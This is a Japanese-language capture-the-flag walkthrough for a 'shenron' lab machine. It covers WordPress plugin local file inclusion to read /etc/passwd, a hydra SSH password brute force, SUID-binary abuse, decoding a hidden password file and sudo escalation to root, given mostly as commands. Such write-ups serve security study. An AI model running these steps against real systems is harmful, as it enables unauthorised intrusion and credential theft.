@@ -1,0 +1,51 @@
+### 論点
+- wordpressのpluginの脆弱性
+
+### keyword
+- LFI,exploitdb,hydra
+
+## 攻略
+- nmap
+  - 22,80,8080
+- `nmap -scrip=http-wordpress-users.nse $IP`
+  - ユーザ名はadminとわかる 
+- wpscanする
+  - もしエラーでたらNATにしてupdateする
+  - `wpscan --url http://shenron:8080 -e ap`
+- 見つかった脆弱性を検索する
+  - `wordpress plugin site editor local file inclusion`
+  - 見つかったパスをコピーする
+- LFI
+  - ブラウザに次の貼り付ける
+  - `http://~:8080/wp-content/plugins/site-editor/~=/etc/passwd` コピーをペーストする     
+  - ユーザはroot,jenny,shenron
+- `hydra -l jenny -e nsr ssh://$IP`
+  - nはnull,sはログインとパスワードが同じ,rはユーザ名を逆にしたもの
+- sshで侵入
+  - `ssh jenny@$IP` passwordもjenny
+- ユーザを調べる
+  - `id`  
+  - `ls -l /home`
+- `sudo -l`はなし
+- SUID
+  - `/usr/bin/Execute`という気になるのがある。pkexecもある
+  - 
+  - なんかよくわからんが、このコマンドを実行してみる`/usr/bin/Execute`   
+- もう一回SUID
+  - `/mnt/bash`という謎のコマンドが増えている
+  - `/mnt/bash -p`を実行する
+- ユーザの確認
+  - `id` euidにshenronというのが増えている
+  - `whoami` これが実際のユーザ
+- `sudo -l`
+  - passwordはjennyだが 
+- ファイルを見つける
+  - `find /home/shenron -iname '*pass*' -type f 2>/dev/null`
+  - `cat /home/shenron/Desktop/.pass`  
+  - `cat /home/shenron/Desktop/.pass | base32 -d`
+  - passwordをコピーしておく
+- `su shenron`
+- `id`
+  - sudoグループに属しているのでsudoコマンドでrootになる
+- rootになる
+  - `sudo su`    
